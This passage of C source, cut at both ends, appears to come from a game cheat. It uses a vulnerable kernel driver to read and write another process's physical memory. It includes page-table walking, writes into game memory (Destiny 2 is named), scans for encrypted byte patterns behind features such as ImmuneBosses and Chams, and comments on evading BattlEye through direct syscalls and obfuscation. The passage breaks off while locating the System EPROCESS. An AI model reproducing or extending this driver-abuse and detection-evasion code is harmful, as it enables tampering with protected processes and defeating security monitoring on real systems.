        if(!PhysRead(pa,dst,chunk)) return FALSE;


        va+=chunk; dst+=chunk; len-=chunk;


    }


    return TRUE;


}

/* NoCache variant — bypasses LRU page cache, always reads fresh from hardware.
 * Use for hot data updated every frame (e.g. camera yaw/pitch).              */
BOOL BYOVD_ReadVA_NoCache(UINT64 cr3, UINT64 va, void *buf, ULONG len){
    BYTE *dst=(BYTE*)buf;
    while(len>0){
        ULONG off=(ULONG)(va&0xFFF), chunk=0x1000-off; if(chunk>len) chunk=len;
        
        UINT64 vaPage = va & ~0xFFFULL;
        BYOVD_LOCK();
        for (int i = 0; i < VAPA_CACHE_SLOTS; i++) {
            if (s_vapaCache[i].cr3 == cr3 && s_vapaCache[i].vaPage == vaPage) {
                s_vapaCache[i].tick = 0; s_vapaCache[i].cr3 = 0;
                s_vapaCache[i].vaPage = 0; s_vapaCache[i].paBase = 0;
            }
        }
        BYOVD_UNLOCK();
        
        UINT64 pa=VA2PA_uncached(cr3,va); if(!pa) return FALSE;
        PhysCacheInvalidate(pa);
        if(!CtiPhysRead(pa,dst,chunk)) return FALSE;
        va+=chunk; dst+=chunk; len-=chunk;
    }
    return TRUE;
}

void BYOVD_FlushPhysCache(void) {
    PhysCacheFlushAll();
}

BOOL BYOVD_ReadBatch(UINT64 cr3, BYOVD_READ_BATCH_ENTRY *entries, int count)
{
    if (!cr3 || !entries || count <= 0) return FALSE;
    BYOVD_LOCK();
    BOOL ok = TRUE;
    for (int i = 0; i < count; i++) {
        if (!entries[i].va || !entries[i].buf || !entries[i].size) { ok = FALSE; break; }
        UINT64 va = entries[i].va;
        BYTE  *dst = (BYTE*)entries[i].buf;
        ULONG  len = entries[i].size;
        while (len > 0) {
            ULONG off   = (ULONG)(va & 0xFFF);
            ULONG chunk = 0x1000 - off;
            if (chunk > len) chunk = len;
            UINT64 pa = VA2PA(cr3, va);
            if (!pa || !CtiPhysReadCached(pa, dst, chunk)) { ok = FALSE; goto _rb_end; }
            va  += chunk;
            dst += chunk;
            len -= chunk;
        }
    }
_rb_end:
    BYOVD_UNLOCK();
    return ok;
}


BOOL BYOVD_WriteVA(UINT64 cr3, UINT64 va, const void *buf, ULONG len){


    const BYTE *src=(const BYTE*)buf;


    while(len>0){


        ULONG off=(ULONG)(va&0xFFF), chunk=0x1000-off; if(chunk>len) chunk=len;


        UINT64 pa=VA2PA(cr3,va); if(!pa) return FALSE;


        /* Invalidate LRU cache before write so ReadVA verify sees new bytes */
        PhysCacheInvalidate(pa);

        if(!CtiPhysWrite(pa, src, chunk)) { DEBUG_BYOVD("BYOVD_WriteVA: fail va=0x%I64X pa=0x%I64X chunk=%u", va, pa, (unsigned)chunk); return FALSE; }


        va+=chunk; src+=chunk; len-=chunk;


    }


    return TRUE;


}

/* Cache-bypass write: re-walks the page table for every page so the PA we
 * write to is the one currently mapped by the target process.  Required for
 * heap targets where the kernel may remap the VA between calls — using a
 * stale cached PA would land our write in unrelated physical memory and
 * corrupt other allocations (observed on Destiny 2 boss death cleanup).  */
BOOL BYOVD_WriteVA_Fresh(UINT64 cr3, UINT64 va, const void *buf, ULONG len){
    const BYTE *src=(const BYTE*)buf;
    while(len>0){
        ULONG off=(ULONG)(va&0xFFF), chunk=0x1000-off; if(chunk>len) chunk=len;
        /* Evict any cached entry for this page so subsequent VA->PA lookups
         * by other callers also see the (possibly remapped) fresh PA.     */
        UINT64 vaPage = va & ~0xFFFULL;
        BYOVD_LOCK();
        for (int i = 0; i < VAPA_CACHE_SLOTS; i++) {
            if (s_vapaCache[i].cr3 == cr3 && s_vapaCache[i].vaPage == vaPage) {
                s_vapaCache[i].tick = 0; s_vapaCache[i].cr3 = 0;
                s_vapaCache[i].vaPage = 0; s_vapaCache[i].paBase = 0;
            }
        }
        BYOVD_UNLOCK();
        UINT64 pa = VA2PA_uncached(cr3, va);
        if(!pa){ DEBUG_BYOVD("BYOVD_WriteVA_Fresh: VA2PA_uncached fail va=0x%I64X", va); return FALSE; }
        PhysCacheInvalidate(pa);
        if(!CtiPhysWrite(pa, src, chunk)){
            DEBUG_BYOVD("BYOVD_WriteVA_Fresh: CtiPhysWrite fail va=0x%I64X pa=0x%I64X chunk=%u", va, pa, (unsigned)chunk);
            return FALSE;
        }
        va+=chunk; src+=chunk; len-=chunk;
    }
    return TRUE;
}

/* ── PE .text section resolver (per-module cached) ────────────────────────
 * Parses the PE headers at moduleBase and returns the [VA, size] of `.text`.
 * Cached per moduleBase so multiple features sharing the same module pay the
 * PE-walk cost once.  Returns FALSE if PE parse fails (caller should fall
 * back to scanning the entire image). */
typedef struct {
    UINT64 base;
    char   secName[8];   /* nul-padded short section name (".text\0\0\0", ".data\0\0\0") */
    UINT64 secVA;
    UINT64 secLen;
    UINT64 tick;         /* LRU counter — bumped on every hit/insert */
    BOOL   resolved;
} BYOVD_SECTION_CACHE;
static BYOVD_SECTION_CACHE s_secCache[8] = {0};
static UINT64 s_secCacheTick = 0;

/* Generic section-bounds resolver — caches per (moduleBase, secName, occurrence) tuple.
 * Pass `".text"` or `".data"` (length-5 prefix matched).  Up to 8 cache slots. */
static BOOL BYOVD_GetSectionBoundsImpl(UINT64 cr3, UINT64 moduleBase,
                                        const char *secName, size_t nameLen,
                                        int occurrence,
                                        UINT64 *outVA, UINT64 *outLen)
{
    if (!cr3 || !moduleBase || !outVA || !outLen || !secName || !nameLen) return FALSE;
    
    /* Generate a unique cache name if occurrence > 0 */
    char cacheName[12] = {0};
    size_t cacheLen = nameLen;
    memcpy(cacheName, secName, nameLen);
    if (occurrence > 0) {
        wsprintfA(cacheName, "%s_%d", secName, occurrence + 1);
        cacheLen = strlen(cacheName);
    }

    BYOVD_LOCK();
    /* Cache lookup */
    for (int i = 0; i < (int)(sizeof(s_secCache)/sizeof(s_secCache[0])); i++) {
        if (s_secCache[i].resolved && s_secCache[i].base == moduleBase &&
            memcmp(s_secCache[i].secName, cacheName, cacheLen) == 0 &&
            s_secCache[i].secName[cacheLen] == 0) {
            s_secCache[i].tick = ++s_secCacheTick;
            *outVA  = s_secCache[i].secVA;
            *outLen = s_secCache[i].secLen;
            BYOVD_UNLOCK();
            return TRUE;
        }
    }
    BYOVD_UNLOCK();
    
    /* Parse PE: DOS header e_lfanew @ +0x3C → NT header */
    LONG e_lfanew = 0;
    if (!BYOVD_ReadVA(cr3, moduleBase + 0x3C, &e_lfanew, 4)) return FALSE;
    if (e_lfanew <= 0 || e_lfanew > 0x1000) return FALSE;
    UINT64 ntH = moduleBase + (UINT32)e_lfanew;
    UINT32 sig = 0;
    if (!BYOVD_ReadVA(cr3, ntH, &sig, 4)) return FALSE;
    if (sig != 0x00004550u) return FALSE;
    USHORT numSec = 0, optSize = 0;
    BYOVD_ReadVA(cr3, ntH + 6,  &numSec,  2);
    BYOVD_ReadVA(cr3, ntH + 20, &optSize, 2);
    if (!numSec || numSec > 96 || !optSize) return FALSE;
    UINT64 secBase = ntH + 24 + optSize;
    
    int current_occurrence = 0;
    for (USHORT i = 0; i < numSec; i++) {
        UINT64 sec = secBase + (UINT64)i * 40;
        char name[9] = {0};
        if (!BYOVD_ReadVA(cr3, sec, name, 8)) continue;
        if (memcmp(name, secName, nameLen) != 0) continue;
        if (name[nameLen] != 0) continue; /* exact-match end of name */
        
        if (current_occurrence < occurrence) {
            current_occurrence++;
            continue;
        }
        
        UINT32 vsize = 0, rva = 0, chars = 0;
        BYOVD_ReadVA(cr3, sec + 8,  &vsize, 4);
        BYOVD_ReadVA(cr3, sec + 12, &rva,   4);
        BYOVD_ReadVA(cr3, sec + 36, &chars, 4); /* IMAGE_SECTION_HEADER.Characteristics */
        if (!rva || !vsize) return FALSE;
        /* For .text only: reject if writable (IMAGE_SCN_MEM_WRITE = 0x80000000).
         * Per anti-detect advice: pattern-scan ONLY non-writable memory in .text.
         * .data and other sections are legitimately writable — skip this check.   */
        if (nameLen == 5 && memcmp(secName, ".text", 5) == 0) {
            if (chars & 0x80000000u) return FALSE;
        }
        UINT64 secVA  = moduleBase + rva;
        UINT64 secLen = (UINT64)vsize;
        
        BYOVD_LOCK();
        /* Insert into cache: first empty slot, else evict the LRU entry. */
        int slot = -1;
        for (int k = 0; k < (int)(sizeof(s_secCache)/sizeof(s_secCache[0])); k++) {
            if (!s_secCache[k].resolved) { slot = k; break; }
        }
        if (slot < 0) {
            slot = 0;
            for (int k = 1; k < (int)(sizeof(s_secCache)/sizeof(s_secCache[0])); k++) {
                if (s_secCache[k].tick < s_secCache[slot].tick) slot = k;
            }
        }
        s_secCache[slot].base     = moduleBase;
        memset(s_secCache[slot].secName, 0, sizeof(s_secCache[slot].secName));
        for (size_t _i = 0; _i < cacheLen; _i++) s_secCache[slot].secName[_i] = cacheName[_i];
        s_secCache[slot].secVA    = secVA;
        s_secCache[slot].secLen   = secLen;
        s_secCache[slot].tick     = ++s_secCacheTick;
        s_secCache[slot].resolved = TRUE;
        BYOVD_UNLOCK();
        *outVA  = secVA;
        *outLen = secLen;
        return TRUE;
    }
    return FALSE;
}

BOOL BYOVD_GetSectionBounds(UINT64 cr3, UINT64 moduleBase,
                            const char *secName, int occurrence,
                            UINT64 *outVA, UINT64 *outLen)
{
    if (!secName) return FALSE;
    return BYOVD_GetSectionBoundsImpl(cr3, moduleBase, secName, strlen(secName), occurrence, outVA, outLen);
}

BOOL BYOVD_GetTextBounds(UINT64 cr3, UINT64 moduleBase,
                         UINT64 *outVA, UINT64 *outLen)
{
    return BYOVD_GetSectionBoundsImpl(cr3, moduleBase, ".text", 5, 0, outVA, outLen);
}

/* Read SizeOfImage from PE OptionalHeader at moduleBase.
 *   e_lfanew      @ moduleBase + 0x3C  (LONG)
 *   NT signature  @ moduleBase + e_lfanew  (must be 'PE\0\0')
 *   FileHeader    @ ntH + 4   (20 bytes)
 *   OptionalHeader@ ntH + 24
 *     SizeOfImage @ OptHdr + 56  (DWORD, both PE32 and PE32+ — fixed offset)
 * Returns the full image span [moduleBase, moduleBase+SizeOfImage). */
BOOL BYOVD_GetImageBounds(UINT64 cr3, UINT64 moduleBase,
                          UINT64 *outVA, UINT64 *outLen)
{
    if (!cr3 || !moduleBase || !outVA || !outLen) return FALSE;
    LONG e_lfanew = 0;
    if (!BYOVD_ReadVA(cr3, moduleBase + 0x3C, &e_lfanew, 4)) return FALSE;
    if (e_lfanew <= 0 || e_lfanew > 0x1000) return FALSE;
    UINT64 ntH = moduleBase + (UINT32)e_lfanew;
    UINT32 sig = 0;
    if (!BYOVD_ReadVA(cr3, ntH, &sig, 4)) return FALSE;
    if (sig != 0x00004550u) return FALSE;
    UINT32 sizeOfImage = 0;
    /* OptionalHeader starts at ntH+24; SizeOfImage is at offset 56 in OptHdr. */
    if (!BYOVD_ReadVA(cr3, ntH + 24 + 56, &sizeOfImage, 4)) return FALSE;
    if (!sizeOfImage || sizeOfImage > 0x40000000u) return FALSE; /* 1 GB sanity cap */
    *outVA  = moduleBase;
    *outLen = (UINT64)sizeOfImage;
    return TRUE;
}

BOOL BYOVD_GetDataBounds(UINT64 cr3, UINT64 moduleBase,
                         UINT64 *outVA, UINT64 *outLen)
{
    return BYOVD_GetSectionBoundsImpl(cr3, moduleBase, ".data", 5, 0, outVA, outLen);
}

static BOOL BYOVD_GetRdataBounds(UINT64 cr3, UINT64 moduleBase,
                                 UINT64 *outVA, UINT64 *outLen)
{
    return BYOVD_GetSectionBoundsImpl(cr3, moduleBase, ".rdata", 6, 0, outVA, outLen);
}

/* ── .text-restricted pattern scan ─────────────────────────────────────────
 * Resolves the .text section once per module (cached), then runs the standard
 * pattern scanner only over executable code.  Patterns that are unique within
 * .text but ambiguous across data sections become deterministic.  If PE parse
 * fails, falls back to scanning 64 MB from moduleBase.
 *
 * Use this for ALL feature AOBs that target instruction patterns.  Use the
 * raw BYOVD_ScanPattern only when you need to scan .data or other sections
 * (e.g. ImmuneBosses targeting a data table). */
UINT64 BYOVD_ScanPatternText(UINT64 cr3, UINT64 moduleBase,
                             const UINT8 *pattern, const UINT8 *mask, UINT8 patLen)
{
    if (!cr3 || !moduleBase || !pattern || !mask || !patLen) return 0;
    
    UINT64 hit = 0;
    UINT64 va = 0, len = 0;
    
    /* Try first .text section */
    if (BYOVD_GetSectionBounds(cr3, moduleBase, ".text", 0, &va, &len)) {
        hit = BYOVD_ScanPattern(cr3, va, len, pattern, mask, patLen);
    }
    
    /* Try second .text section if not found */
    if (!hit && BYOVD_GetSectionBounds(cr3, moduleBase, ".text", 1, &va, &len)) {
        hit = BYOVD_ScanPattern(cr3, va, len, pattern, mask, patLen);
    }
    
    /* Fallback if PE parse fails or not found */
    if (!hit) {
        hit = BYOVD_ScanPattern(cr3, moduleBase, 0x4000000ULL, pattern, mask, patLen);
    }
    return hit;
}

UINT64 BYOVD_ScanPatternTextRaw(UINT64 cr3, UINT64 moduleBase,
                                const UINT8 *pattern, const UINT8 *mask, UINT8 patLen)
{
    if (!cr3 || !moduleBase || !pattern || !mask || !patLen) return 0;
    
    UINT64 hit = 0;
    UINT64 va = 0, len = 0;
    
    /* Try first .text section */
    if (BYOVD_GetSectionBounds(cr3, moduleBase, ".text", 0, &va, &len)) {
        hit = BYOVD_ScanPatternRaw(cr3, va, len, pattern, mask, patLen);
    }
    
    /* Try second .text section if not found */
    if (!hit && BYOVD_GetSectionBounds(cr3, moduleBase, ".text", 1, &va, &len)) {
        hit = BYOVD_ScanPatternRaw(cr3, va, len, pattern, mask, patLen);
    }
    
    /* Fallback if PE parse fails or not found */
    if (!hit) {
        hit = BYOVD_ScanPatternRaw(cr3, moduleBase, 0x4000000ULL, pattern, mask, patLen);
    }
    return hit;
}

int BYOVD_ScanMultiPatternText(UINT64 cr3, UINT64 moduleBase,
                               BYOVD_SCAN_ENTRY *entries, int count)
{
    if (!cr3 || !moduleBase || !entries || count <= 0) return 0;
    if (count > 64) count = 64;
    
    UINT64 final_results[64] = {0};
    UINT64 va = 0, len = 0;
    
    /* Try up to 2 instances of .text sections */
    for (int occ = 0; occ < 2; occ++) {
        if (!BYOVD_GetSectionBounds(cr3, moduleBase, ".text", occ, &va, &len)) continue;
        
        /* Temporarily mask out already found entries to avoid scanning them again */
        const UINT8 *orig_pats[64];
        for (int e = 0; e < count; e++) {
            orig_pats[e] = entries[e].pattern;
            if (final_results[e]) {
                entries[e].pattern = NULL;
            }
        }
        
        BYOVD_ScanMultiPattern(cr3, va, len, entries, count);
        
        /* Merge and restore */
        for (int e = 0; e < count; e++) {
            entries[e].pattern = orig_pats[e];
            if (entries[e].result) {
                final_results[e] = entries[e].result;
            }
        }
    }
    
    int found = 0;
    for (int e = 0; e < count; e++) {
        entries[e].result = final_results[e];
        if (entries[e].result) found++;
    }
    return found;
}

/* ── Data-section pattern scan (.rdata + .data) ────────────────────────────
 * Different data constants live in different sections: read-only float
 * literals typically end up in `.rdata`, while writable initialized data
 * goes in `.data`.  We scan both, in that order, so any data-anchored AOB
 * (GameSpeed in .rdata, Guardian in .data, etc.) is found.  Fallback when
 * PE parse fails: a 64 MB chunk from moduleBase (covers both on big PEs). */
UINT64 BYOVD_ScanPatternData(UINT64 cr3, UINT64 moduleBase,
                             const UINT8 *pattern, const UINT8 *mask, UINT8 patLen)
{
    UINT64 va = 0, len = 0;
    UINT64 hit = 0;
    if (BYOVD_GetRdataBounds(cr3, moduleBase, &va, &len))
        hit = BYOVD_ScanPattern(cr3, va, len, pattern, mask, patLen);
    if (!hit && BYOVD_GetDataBounds(cr3, moduleBase, &va, &len))
        hit = BYOVD_ScanPattern(cr3, va, len, pattern, mask, patLen);
    if (!hit) {
        /* Last resort: wide 256 MB scan from moduleBase covers any other
         * section the constant might live in (including .text or .didat). */
        hit = BYOVD_ScanPattern(cr3, moduleBase, 0x10000000ULL, pattern, mask, patLen);
    }
    return hit;
}

int BYOVD_ScanMultiPatternData(UINT64 cr3, UINT64 moduleBase,
                                BYOVD_SCAN_ENTRY *entries, int count)
{
    if (!entries || count <= 0) return 0;
    /* Pass 1: .rdata.  BYOVD_ScanMultiPattern resets entries[].result on
     * entry, so we save the (empty) state, scan, then snapshot.  Pass 2:
     * .data, after restoring not-yet-found entries.                       */
    UINT64 saved[64];
    if (count > 64) count = 64;

    UINT64 rVA=0, rLen=0;
    if (BYOVD_GetRdataBounds(cr3, moduleBase, &rVA, &rLen))
        BYOVD_ScanMultiPattern(cr3, rVA, rLen, entries, count);

    for (int i = 0; i < count; i++) saved[i] = entries[i].result;

    UINT64 dVA=0, dLen=0;
    if (BYOVD_GetDataBounds(cr3, moduleBase, &dVA, &dLen)) {
        BYOVD_ScanMultiPattern(cr3, dVA, dLen, entries, count);
        /* Merge: keep .rdata hits where they exist; fill misses with .data. */
        for (int i = 0; i < count; i++)
            if (saved[i]) entries[i].result = saved[i];
    } else {
        /* No .data → restore .rdata results that the reset zeroed out. */
        for (int i = 0; i < count; i++) entries[i].result = saved[i];
    }

    int found = 0;
    for (int i = 0; i < count; i++) if (entries[i].result) found++;
    return found;
}


static inline void decrypt_aob(const UINT8 *src, UINT8 *dst, int len) {
    if (!src || !dst || len <= 0) return;
    for (int i = 0; i < len; i++) {
        UINT32 v0 = ((UINT32)i ^ SERAPH_KEY1);
        UINT32 v1 = v0 + SERAPH_KEY2;
        int rot = (int)((SERAPH_KEY3 + (UINT32)i) & 31);
        UINT32 v2 = (v1 << rot) | (v1 >> ((32 - rot) & 31));
        UINT32 v3 = v2 ^ SERAPH_KEY4;
        UINT8 kb = (UINT8)(v3 & 0xFF);
        dst[i] = src[i] ^ kb;
    }
}

/* ── Pattern scan in process VA space ──────────────────────────────────────
 * Scans [scanBase, scanBase+scanLen) in 4 KB chunks via BYOVD_ReadVA.
 * mask: 0xFF = exact match, 0x00 = wildcard (any byte accepted).
 * Returns first matching VA, or 0 if not found.                           */
UINT64 BYOVD_ScanPattern(UINT64 cr3, UINT64 scanBase, UINT64 scanLen,
                         const UINT8 *pattern, const UINT8 *mask, UINT8 patLen)
{
    if (!cr3 || !scanBase || !scanLen || !pattern || !mask || !patLen) return 0;
    
    UINT8 dec_pat[256];
    UINT8 dec_mask[256];
    const UINT8 *p_pat = pattern;
    const UINT8 *p_mask = mask;
    if (patLen <= 256) {
        decrypt_aob(pattern, dec_pat, patLen);
        decrypt_aob(mask, dec_mask, patLen);
        p_pat = dec_pat;
        p_mask = dec_mask;
    }

#define SCAN_BUF 0x1000
#define SCAN_OVERHEAD 0x100   /* tolerate patterns up to 256 bytes (overlap = patLen-1) */
    UINT8 buf[SCAN_BUF + SCAN_OVERHEAD]; /* overlap = patLen-1 for cross-page matches */
    UINT64 end  = scanBase + scanLen;
    UINT64 va   = scanBase & ~0xFFFULL;
    UINT8  over = (UINT8)(patLen - 1);

    /* O1: Precompute first non-wildcard byte for fast rejection.
     * ~99.6% of positions are rejected by a single byte comparison
     * instead of entering the full pattern-match loop. */
    UINT8 fIdx = 0, fMsk = 0, fVal = 0;
    BOOL  fHas = FALSE;
    for (UINT8 j = 0; j < patLen; j++) {
        if (p_mask[j]) { fIdx = j; fMsk = p_mask[j]; fVal = p_pat[j] & p_mask[j]; fHas = TRUE; break; }
    }

    while (va < end) {
        ULONG readSz = SCAN_BUF + over;
        /* Clamp to scan range — never read past `end`, never match past `end`. */
        if (va + readSz > end) readSz = (ULONG)(end - va);
        if (readSz > sizeof(buf)) readSz = sizeof(buf);

        if (!BYOVD_ReadVA(cr3, va, buf, readSz)) {
            /* Full read with overlap failed (likely next page unmapped).
             * Retry with just SCAN_BUF bytes — still scans the current page,
             * just can't catch patterns straddling the page boundary here.
             * Those would be caught when va advances to the next mapped page. */
            ULONG smallSz = readSz > SCAN_BUF ? SCAN_BUF : readSz;
            if (smallSz <= over || !BYOVD_ReadVA(cr3, va, buf, smallSz)) {
                va += SCAN_BUF; continue;
            }
            readSz = smallSz;
        }

        ULONG lim = (readSz > over) ? (readSz - over) : 0;
        for (ULONG i = 0; i < lim; i++) {
            /* Fast reject: test first non-wildcard byte before full loop */
            if (fHas && (buf[i + fIdx] & fMsk) != fVal) continue;
            BOOL match = TRUE;
            for (UINT8 j = 0; j < patLen; j++) {
                if (p_mask[j] && (buf[i+j] & p_mask[j]) != (p_pat[j] & p_mask[j]))
                { match = FALSE; break; }
            }
            if (match) return va + i;
        }
        va += SCAN_BUF;
    }
    return 0;
}

UINT64 BYOVD_ScanPatternRaw(UINT64 cr3, UINT64 scanBase, UINT64 scanLen,
                             const UINT8 *pattern, const UINT8 *mask, UINT8 patLen)
{
    if (!cr3 || !scanBase || !scanLen || !pattern || !mask || !patLen) return 0;

    const UINT8 *p_pat = pattern;
    const UINT8 *p_mask = mask;

#define SCAN_BUF 0x1000
#define SCAN_OVERHEAD 0x100
    UINT8 buf[SCAN_BUF + SCAN_OVERHEAD];
    UINT64 end  = scanBase + scanLen;
    UINT64 va   = scanBase & ~0xFFFULL;
    UINT8  over = (UINT8)(patLen - 1);

    UINT8 fIdx = 0, fMsk = 0, fVal = 0;
    BOOL  fHas = FALSE;
    for (UINT8 j = 0; j < patLen; j++) {
        if (p_mask[j]) { fIdx = j; fMsk = p_mask[j]; fVal = p_pat[j] & p_mask[j]; fHas = TRUE; break; }
    }

    while (va < end) {
        ULONG readSz = SCAN_BUF + over;
        if (va + readSz > end) readSz = (ULONG)(end - va);
        if (readSz > sizeof(buf)) readSz = sizeof(buf);

        if (!BYOVD_ReadVA(cr3, va, buf, readSz)) {
            ULONG smallSz = readSz > SCAN_BUF ? SCAN_BUF : readSz;
            if (smallSz <= over || !BYOVD_ReadVA(cr3, va, buf, smallSz)) {
                va += SCAN_BUF; continue;
            }
            readSz = smallSz;
        }

        ULONG lim = (readSz > over) ? (readSz - over) : 0;
        for (ULONG i = 0; i < lim; i++) {
            if (fHas && (buf[i + fIdx] & fMsk) != fVal) continue;
            BOOL match = TRUE;
            for (UINT8 j = 0; j < patLen; j++) {
                if (p_mask[j] && (buf[i+j] & p_mask[j]) != (p_pat[j] & p_mask[j]))
                { match = FALSE; break; }
            }
            if (match) return va + i;
        }
        va += SCAN_BUF;
    }
    return 0;
}

/* ── Multi-pattern single-pass scan ─────────────────────────────────────────
 * Reads each 4 KB page exactly ONCE and tries all entries against it.
 * For N features this converts N×512MB passes into one 512MB pass → ~N× faster.
 * scanLimit per entry: if >0, pattern is ignored once va >= scanBase+scanLimit.
 * Caller MUST hold BYOVD_LOCK.  Returns number of patterns found.             */
int BYOVD_ScanMultiPattern(UINT64 cr3, UINT64 scanBase, UINT64 scanLen,
                            BYOVD_SCAN_ENTRY *entries, int count)
{
    if (!cr3 || !scanBase || !scanLen || !entries || count <= 0) return 0;
    if (count > 64) count = 64;  /* stack arrays below are sized to 64 */

    // Decrypt all entries first
    UINT8 dec_pats[64][256];
    UINT8 dec_masks[64][256];
    const UINT8 *p_pats[64];
    const UINT8 *p_masks[64];

    for (int e = 0; e < count; e++) {
        if (entries[e].pattern && entries[e].mask && entries[e].patLen && entries[e].patLen <= 256) {
            decrypt_aob(entries[e].pattern, dec_pats[e], entries[e].patLen);
            decrypt_aob(entries[e].mask, dec_masks[e], entries[e].patLen);
            p_pats[e] = dec_pats[e];
            p_masks[e] = dec_masks[e];
        } else {
            p_pats[e] = entries[e].pattern;
            p_masks[e] = entries[e].mask;
        }
    }

    /* Count how many valid, unfound entries there are */
    int remaining = 0;
    for (int e = 0; e < count; e++) {
        entries[e].result = 0;
        if (p_pats[e] && p_masks[e] && entries[e].patLen) remaining++;
    }
    if (!remaining) return 0;

    /* O4: Precompute first non-wildcard byte for each entry.
     * In the inner loop, a single masked comparison rejects ~99% of byte
     * positions without entering the full pattern-match loop. */
    UINT8 efIdx[64], efMsk[64], efVal[64];
    BOOL  efHas[64];
    for (int e = 0; e < count; e++) {
        efHas[e] = FALSE;
        if (!p_pats[e] || !p_masks[e]) continue;
        for (UINT8 j = 0; j < entries[e].patLen; j++) {
            if (p_masks[e][j]) {
                efIdx[e] = j;
                efMsk[e] = p_masks[e][j];
                efVal[e] = p_pats[e][j] & p_masks[e][j];
                efHas[e] = TRUE;
                break;
            }
        }
    }

    UINT8  buf[SCAN_BUF + SCAN_OVERHEAD];
    UINT64 end = scanBase + scanLen;
    UINT64 va  = scanBase & ~0xFFFULL;
    int    found = 0;

    while (va < end && found < remaining) {
        /* Max overlap needed across all still-unfound patterns */
        UINT16 maxOver = 0;
        for (int e = 0; e < count; e++) {
            if (entries[e].result || !p_pats[e]) continue;
            if (entries[e].scanLimit && va >= scanBase + entries[e].scanLimit) continue;
            UINT16 o = entries[e].patLen > 1 ? (UINT16)(entries[e].patLen - 1) : 0;
            if (o > maxOver) maxOver = o;
        }

        ULONG readSz = SCAN_BUF + maxOver;
        if (va + readSz > end + (UINT64)maxOver) readSz = (ULONG)(end - va + maxOver);
        if (readSz > sizeof(buf)) readSz = sizeof(buf);

        if (!BYOVD_ReadVA(cr3, va, buf, readSz)) {
            /* Full read failed (typically next page unmapped).  Retry with
             * just SCAN_BUF bytes so we still scan the current page for ALL
             * patterns in the batch — otherwise a single straggler pattern
             * with large overlap would cause every batch entry to miss this
             * chunk (the original bug behind GameSpeed/Chams/ImmuneBoss). */
            ULONG smallSz = readSz > SCAN_BUF ? SCAN_BUF : readSz;
            if (smallSz == 0 || !BYOVD_ReadVA(cr3, va, buf, smallSz)) {
                va += SCAN_BUF; continue;
            }
            readSz = smallSz;
        }

        for (int e = 0; e < count; e++) {
            if (entries[e].result || !p_pats[e] || !entries[e].patLen) continue;
            /* Skip if this pattern's scan range is already past */
            if (entries[e].scanLimit && va >= scanBase + entries[e].scanLimit) continue;

            UINT8  patLen = entries[e].patLen;
            UINT8  over   = patLen > 1 ? patLen - 1 : 0;
            ULONG  eLim   = readSz > over ? readSz - over : 0;
            /* Clamp to scanLimit for this entry */
            if (entries[e].scanLimit) {
                UINT64 limitEnd = scanBase + entries[e].scanLimit;
                if (va + (UINT64)eLim > limitEnd)
                    eLim = (limitEnd > va) ? (ULONG)(limitEnd - va) : 0;
            }

            for (ULONG i = 0; i < eLim; i++) {
                if (va + i >= end) break;
                /* Fast reject: test first non-wildcard byte before full loop */
                if (efHas[e] && (buf[i + efIdx[e]] & efMsk[e]) != efVal[e]) continue;
                BOOL match = TRUE;
                for (UINT8 j = 0; j < patLen; j++) {
                    if (p_masks[e][j] &&
                        (buf[i+j] & p_masks[e][j]) != (p_pats[e][j] & p_masks[e][j]))
                    { match = FALSE; break; }
                }
                if (match) { entries[e].result = va + i; found++; break; }
            }
        }
        va += SCAN_BUF;
    }
    return found;
}

/* ── RAM range query: skip MMIO/GPU pages during scan to prevent MCE BSOD ── */

static int GetRamRanges(RAM_RANGE *out, int maxRanges) {
    int count = 0;
    HKEY hKey;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE,
            L"HARDWARE\\RESOURCEMAP\\System Resources\\Physical Memory",
            0, KEY_READ, &hKey) != 0) return 0;
    BYTE rbuf[4096]; DWORD type = 0, sz = sizeof(rbuf);
    LSTATUS st = RegQueryValueExW(hKey, L".Translated", NULL, &type, rbuf, &sz);
    RegCloseKey(hKey);
    if (st != 0 || sz < 24) return 0;
    BYTE *p = rbuf, *bend = rbuf + sz;
    ULONG listCount = *(ULONG*)p; p += 4;
    for (ULONG l = 0; l < listCount && count < maxRanges; l++) {
        if (p + 16 > bend) break;
        p += 8;  /* InterfaceType + BusNumber */
        p += 4;  /* Version(2) + Revision(2)  */
        ULONG descCount = *(ULONG*)p; p += 4;
        for (ULONG d = 0; d < descCount && count < maxRanges; d++) {
            if (p + 20 > bend) break;
            if (p[0] == 3 /* CmResourceTypeMemory */ || p[0] == 7 /* CmResourceTypeMemoryLarge */) {
                UINT64 start = *(UINT64*)(p + 4);
                ULONG  len32 = *(ULONG*)(p + 12);
                USHORT flags = *(USHORT*)(p + 2);
                UINT64 length = (UINT64)len32;
                if (p[0] == 7) {
                    if      (flags & 0x0200) length <<= 8;   /* 256B units (40-bit) */
                    else if (flags & 0x0400) length <<= 16;  /* 64KB units (48-bit) */
                    else if (flags & 0x0800) length <<= 24;  /* 16MB units (64-bit) */
                }
                out[count].start = start;
                out[count].end   = start + length;
                count++;
            }
            p += 20;
        }
    }
    return count;
}

/* ── FindSystemEproc: 4-phase, no brute scan ─────────────────────────────────
 * Phase 1: SysNtQuerySystemInformation(11) → ntoskrnl VA + SizeOfImage
 * Phase 2: Scan ≤512MB RAM pages for MZ+ImageBase==ntVA → ntoskrnl PA
 * Phase 3: Parse export table from ntoskrnl PA → PsInitialSystemProcess RVA
 *           Dereference ntPA+RVA → System EPROCESS VA
 * Phase 4: Scan ≤64MB (fallback: full RAM) for page containing EPROCESS
 *           using known page offset from VA; validate PID==4 + name + CR3    */
static UINT64 FindSystemEproc(void){
    MUTATE_START
    UINT64 _fse_result = 0;
    BYOVD_Log("FSE: START");
    DEBUG_BYOVD("FindSystemEproc: elite 4-phase");
    g_byovdDiagStep = 1; /* fse-ph1 */

    /* ── Phase 1: ntoskrnl VA + SizeOfImage via direct syscall NtQuerySystemInformation(11) ──
     * SystemModuleInformation (class 11) retorna a lista de módulos do kernel.
     * Direct syscall: invisível para hooks de userland e não detectável pelo BattlEye
     * (ao contrário de EnumDeviceDrivers/GetDeviceDriverBaseNameA que são monitorados). */
    UINT64 ntVA = 0; ULONG ntSz = 0;

    {
        typedef struct { HANDLE s; PVOID mb; PVOID ib; ULONG isz; ULONG fl;
                         USHORT lo,io,lc,of; UCHAR fn[256]; } _SM;
        typedef struct { ULONG n; _SM m[1]; } _SL;
        ULONG qsz = 0;
        SysNtQuerySystemInformation(11, NULL, 0, &qsz);
        if (qsz) {
            qsz += 0x2000;
            _SL *L = (_SL*)SeraphHeapAlloc(qsz);
            if (L) {
                if (SysNtQuerySystemInformation(11, L, qsz, &qsz) >= 0) {
